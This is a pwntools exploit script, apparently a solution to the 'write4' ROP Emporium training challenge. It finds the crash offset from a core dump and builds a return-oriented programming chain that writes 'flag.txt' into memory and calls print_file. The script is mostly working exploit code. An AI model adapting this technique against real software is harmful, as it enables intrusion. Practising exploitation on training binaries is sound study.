from pwn import *
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] +argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './write4'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

# Exploit starts here :)

io = start()
payload = cyclic(100)
io.sendlineafter('> ', payload)
io.wait()

core = io.corefile
esp = core.rsp
four_byte_pattern = core.read(esp, 4)

_data = struct.pack("Q", 0x00601028)
pop_rdi_ret = struct.pack("Q", 0x0000000000400693)
pop_r14_r15_ret = struct.pack("Q", 0x0000000000400690)
mov_r14_r15_ret = struct.pack("Q", 0x0000000000400628)
print_file = struct.pack("Q", 0x00400510)

_data = 0x00601028
pop_rdi_ret = 0x0000000000400693
pop_r14_r15_ret = 0x0000000000400690
mov_r14_r15_ret = 0x0000000000400628
print_file = 0x00400510

payload = fit({
	four_byte_pattern: [
		pop_r14_r15_ret,
		_data,
		"flag.txt",
		mov_r14_r15_ret,
		pop_rdi_ret,
		_data,
		print_file
	]
})

p = process()
p.sendlineafter('>', payload)
p.interactive()

"""
io = start()
io.sendline(payload)
io.recv()

flag = io.recvline()
success(flag)
"""

